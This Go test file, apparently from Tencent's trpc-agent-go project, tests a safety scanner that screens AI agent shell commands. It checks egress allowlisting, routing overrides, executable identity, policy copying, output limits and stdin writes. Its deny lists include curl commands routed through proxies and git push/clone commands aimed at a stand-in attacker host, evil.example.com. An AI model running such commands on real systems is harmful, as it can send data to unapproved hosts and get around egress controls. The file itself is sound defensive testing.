//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"runtime"
	"strings"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

// #1: a host-bearing curl option value is a real egress target. An allowlisted
// URL fetched THROUGH a non-allowlisted proxy must not pass, and an attached
// --url= carries a target just like a positional operand.
func TestCurlHostBearingOptionValues(t *testing.T) {
	denied := []string{
		// Allowlisted URL, but the connection actually goes to the proxy.
		"curl --proxy=http://evil.example.com https://github.com",
		"curl --proxy http://evil.example.com https://github.com",
		"curl -x evil.example.com:8080 https://github.com",
		"curl -xevil.example.com:8080 https://github.com",
		"curl --socks5 evil.example.com:1080 https://github.com",
		"curl --preproxy=socks5://evil.example.com https://github.com",
		// Attached --url must be denied like the positional form, not downgraded
		// to an unknown-target ask.
		"curl --url=http://evil.example.com",
		"curl --url http://evil.example.com",
	}
	for _, cmd := range denied {
		r := scanWS(t, cmd)
		if r.Decision != DecisionDeny {
			t.Errorf("%q must deny, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	// An allowlisted proxy in front of an allowlisted URL stays allowed, so the
	// rule is targeting the host and not merely the presence of a proxy flag.
	if r := scanWS(t, "curl --proxy=https://proxy.golang.org https://github.com"); r.Decision != DecisionAllow {
		t.Errorf("allowlisted proxy + allowlisted URL should allow, got %s %+v", r.Decision, r.Findings)
	}
	// A file-valued flag's value must still not be read as a host, and a
	// non-host positional operand must not invent one.
	for _, cmd := range []string{
		"curl -o report.txt https://github.com/x",
		"curl --output=report.txt https://github.com/x",
		"curl -X POST https://github.com/x",
	} {
		if r := scanWS(t, cmd); r.Decision != DecisionAllow {
			t.Errorf("%q should allow, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
}

// #1b: connection-routing overrides decouple the URL from the peer actually
// contacted, so they cannot be modelled by a host check and are denied.
func TestCurlRoutingOverrideDenied(t *testing.T) {
	for _, cmd := range []string{
		"curl --connect-to github.com:443:evil.example.com:443 https://github.com",
		"curl --connect-to=github.com:443:evil.example.com:443 https://github.com",
		"curl --resolve github.com:443:203.0.113.9 https://github.com",
	} {
		r := scanWS(t, cmd)
		if r.Decision != DecisionDeny {
			t.Fatalf("%q must deny, got %s %+v", cmd, r.Decision, r.Findings)
		}
		if !hasRule(r, RuleNetRoutingOverride) {
			t.Errorf("%q should report %s, got %+v", cmd, RuleNetRoutingOverride, r.Findings)
		}
	}
}

// #2: git's remote subcommands are egress and obey the domain allowlist, while
// its local subcommands stay completely unaffected.
func TestGitNetworkSubcommands(t *testing.T) {
	external := []string{
		"git clone https://evil.example.com/repo",
		"git push https://evil.example.com/repo main",
		"git fetch https://evil.example.com/repo",
		"git pull https://evil.example.com/repo",
		"git ls-remote https://evil.example.com/repo",
		"git clone git@evil.example.com:org/repo.git",
		"git clone ssh://evil.example.com/repo",
		// scp-style remote with no scheme and no user@.
		"git clone evil.example.com:org/repo.git",
		// A global option and its value must not hide the subcommand.
		"git -C /tmp/work clone https://evil.example.com/repo",
	}
	for _, cmd := range external {
		r := scanWS(t, cmd)
		if r.Decision != DecisionDeny {
			t.Errorf("%q must deny, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	// Allowlisted remotes still work.
	if r := scanWS(t, "git clone https://github.com/org/repo"); r.Decision != DecisionAllow {
		t.Errorf("allowlisted git clone should allow, got %s %+v", r.Decision, r.Findings)
	}
	// Local subcommands (and a bare git carrying no subcommand at all) are not
	// egress and must not gain a network finding.
	for _, cmd := range []string{"git status", "git log --oneline", "git diff HEAD", "git -C /tmp/work status", "git"} {
		r := scanWS(t, cmd)
		if r.Decision != DecisionAllow {
			t.Errorf("%q is local and should allow, got %s %+v", cmd, r.Decision, r.Findings)
		}
		for _, f := range r.Findings {
			if strings.HasPrefix(f.RuleID, "net.") {
				t.Errorf("%q must not produce a network finding, got %s", cmd, f.RuleID)
			}
		}
	}
	// A remote named only in the repository config is an undetermined target.
	r := scanWS(t, "git push origin main")
	if r.Decision != DecisionAsk {
		t.Errorf("git push to a configured remote should ask, got %s %+v", r.Decision, r.Findings)
	}
}

// #3: the strict allowlist must match executable IDENTITY, not a lower-cased
// basename, so a workspace-controlled binary cannot reuse an allowlisted name.
func TestAllowlistPreservesExecutableIdentity(t *testing.T) {
	p := DefaultPolicy()
	p.EnforceAllowlist = true
	p.AllowedCommands = []string{"go"}
	sc := NewScanner(p)
	scan := func(cmd string) ScanReport {
		return sc.Scan(context.Background(), ScanInput{
			ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: cmd,
		})
	}
	// A pathful command never matches a bare allow entry.
	for _, cmd := range []string{"./go build", "/tmp/go build", "work/bin/go build"} {
		if r := scan(cmd); r.Decision != DecisionAsk {
			t.Errorf("%q must not satisfy the bare allow entry, got %s %+v", cmd, r.Decision, r.Findings)
		}
	}
	// The genuine allowlisted command still passes.
	if r := scan("go build ./..."); r.Decision != DecisionAllow {
		t.Errorf("allowlisted go should allow, got %s %+v", r.Decision, r.Findings)
	}
	// Case handling follows the platform's resolution rules, matching
	// internal/shellsafe: exact-case on Linux, folded where PATH is
	// case-insensitive.
	r := scan("GO build")
	if runtime.GOOS == "linux" {
		if r.Decision != DecisionAsk {
			t.Errorf("on Linux GO must not match allow entry go, got %s %+v", r.Decision, r.Findings)
		}
	} else if r.Decision != DecisionAllow {
		t.Errorf("on %s GO resolves to go and should allow, got %s %+v", runtime.GOOS, r.Decision, r.Findings)
	}
	// An empty allowlist allowlists nothing.
	empty := DefaultPolicy()
	empty.EnforceAllowlist = true
	empty.AllowedCommands = nil
	if r := NewScanner(empty).Scan(context.Background(), ScanInput{
		ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "go build",
	}); r.Decision != DecisionAsk {
		t.Errorf("empty allowlist must allow nothing, got %s %+v", r.Decision, r.Findings)
	}
}

// #4: the scanner's policy snapshot is deep, and the accessor does not hand out
// the live policy. Mutating either after construction must not move a verdict.
func TestScannerSnapshotIsDeepAndAccessorIsACopy(t *testing.T) {
	p := DefaultPolicy()
	p.Network.AllowedDomains = []string{"github.com"}
	p.RiskOverrides = map[string]RiskLevel{"net.non_whitelist": RiskCritical}
	p.DependencyInstall.Patterns = []DependencyRule{{Cmd: "pip", ArgsPrefix: []string{"install"}}}
	sc := NewScanner(p)

	before := sc.Scan(context.Background(), ScanInput{
		ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
		Command: "curl https://evil.example.com",
	})
	if before.Decision != DecisionDeny {
		t.Fatalf("baseline must deny, got %s %+v", before.Decision, before.Findings)
	}

	// Mutate the ORIGINAL policy, including nested storage a shallow copy would
	// still share (a slice element's own slice, and a map).
	p.Network.AllowedDomains = append(p.Network.AllowedDomains, "evil.example.com")
	p.Network.AllowedDomains[0] = "evil.example.com"
	p.DeniedCommands = nil
	p.RiskOverrides["net.non_whitelist"] = RiskNone
	p.DependencyInstall.Patterns[0].ArgsPrefix[0] = "mutated"

	// Mutate what the ACCESSOR returned, which must also be a copy.
	got := sc.Policy()
	got.Network.AllowedDomains = []string{"evil.example.com"}
	got.EnforceAllowlist = true
	if got.RiskOverrides != nil {
		got.RiskOverrides["net.non_whitelist"] = RiskNone
	}
	if len(got.DependencyInstall.Patterns) > 0 && len(got.DependencyInstall.Patterns[0].ArgsPrefix) > 0 {
		got.DependencyInstall.Patterns[0].ArgsPrefix[0] = "mutated"
	}

	after := sc.Scan(context.Background(), ScanInput{
		ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
		Command: "curl https://evil.example.com",
	})
	if after.Decision != DecisionDeny {
		t.Errorf("post-construction mutation must not change the verdict, got %s %+v",
			after.Decision, after.Findings)
	}
	if after.RiskLevel != before.RiskLevel {
		t.Errorf("risk override must survive mutation: before=%s after=%s", before.RiskLevel, after.RiskLevel)
	}
	// The compiled dependency rule must still match its original argument.
	if r := sc.Scan(context.Background(), ScanInput{
		ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "pip install requests",
	}); !hasRule(r, RuleDependencyInstall) {
		t.Errorf("nested ArgsPrefix must be deep-copied, got %+v", r.Findings)
	}
}

// #5: codeexec returns file contents to the model alongside stdout, so they
// share the result-size budget; a short output must not let a huge file through.
func TestOutputLimitCoversCodeExecFiles(t *testing.T) {
	p := DefaultPolicy()
	p.Limits.MaxOutputBytes = 512
	pol := NewPermissionPolicy(NewScanner(p))
	cb := pol.OutputLimitCallback()

	result := map[string]any{
		"output": "done\n",
		"output_files": []any{
			map[string]any{"name": "big.txt", "content": strings.Repeat("A", 4096), "mime_type": "text/plain"},
			map[string]any{"name": "also.txt", "content": strings.Repeat("B", 4096), "mime_type": "text/plain"},
		},
	}
	out, err := cb(context.Background(), &tool.AfterToolArgs{ToolName: "execute_code", Result: result})
	if err != nil {
		t.Fatalf("callback error: %v", err)
	}
	if out == nil || out.CustomResult == nil {
		t.Fatalf("oversized file content must be truncated, got %+v", out)
	}
	m, ok := out.CustomResult.(map[string]any)
	if !ok {
		t.Fatalf("expected a map result, got %T", out.CustomResult)
	}
	files, ok := m["output_files"].([]any)
	if !ok || len(files) != 2 {
		t.Fatalf("output_files must be preserved, got %+v", m["output_files"])
	}
	total := len(m["output"].(string))
	for i, f := range files {
		fm := f.(map[string]any)
		content := fm["content"].(string)
		total += len(content)
		if len(content) >= 4096 {
			t.Errorf("file %d content was not truncated (%d bytes)", i, len(content))
		}
		if fm["truncated"] != true {
			t.Errorf("file %d must be marked truncated, got %+v", i, fm["truncated"])
		}
		if fm["name"] == nil || fm["mime_type"] == nil {
			t.Errorf("file %d lost its metadata: %+v", i, fm)
		}
	}
	// One shared budget: many files cannot together exceed the cap by much (the
	// per-field truncation marker is the only allowed overshoot).
	if int64(total) > p.Limits.MaxOutputBytes*2 {
		t.Errorf("model-facing payload %d bytes exceeds the shared budget %d", total, p.Limits.MaxOutputBytes)
	}
	// A result already within budget is left completely untouched.
	small := map[string]any{"output": "ok", "output_files": []any{
		map[string]any{"name": "s.txt", "content": "tiny"},
	}}
	if out, err := cb(context.Background(), &tool.AfterToolArgs{ToolName: "execute_code", Result: small}); err != nil || out != nil {
		t.Errorf("in-budget result must pass through untouched, got %+v %v", out, err)
	}
}

// #6: a write_stdin call that submits the buffered line is a write even when it
// carries no (or only whitespace) characters. Only a true poll is left alone.
func TestWriteStdinSubmitAndWhitespaceGuarded(t *testing.T) {
	p := NewPermissionPolicy(NewScanner(nil))
	denied := []string{
		`{"chars":"   "}`,                    // whitespace still advances the buffered line
		`{"chars":"\t"}`,                     // ditto
		`{"chars":"","append_newline":true}`, // runs whatever the session buffered
		`{"chars":"","submit":true}`,         // "submit" is an alias for append_newline
		`{"chars":"  ","submit":true}`,
	}
	// Registered writers only: skill_write_stdin is NOT here — its launching
	// skill_exec is not a recognised backend, so its writer passes through
	// unclaimed too (see TestWriteStdinClaimsOnlyRegisteredWriters).
	for _, args := range denied {
		for _, name := range []string{"write_stdin", "workspace_write_stdin", "hostexec_write_stdin"} {
			d, _ := p.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName: name, Arguments: []byte(args),
			})
			if d.Action != tool.PermissionActionDeny {
				t.Errorf("%s %s must deny, got %s", name, args, d.Action)
			}
		}
	}
	// A genuine poll — no characters, no submit — is still left to the tool.
	for _, args := range []string{
		`{"chars":""}`,
		`{"chars":"","append_newline":false}`,
		`{"session_id":"s1","yield_time_ms":100}`,
	} {
		d, _ := p.CheckToolPermission(context.Background(), &tool.PermissionRequest{
			ToolName: "hostexec_write_stdin", Arguments: []byte(args),
		})
		if d.Action != tool.PermissionActionAllow {
			t.Errorf("poll %s should allow, got %s", args, d.Action)
		}
	}
}
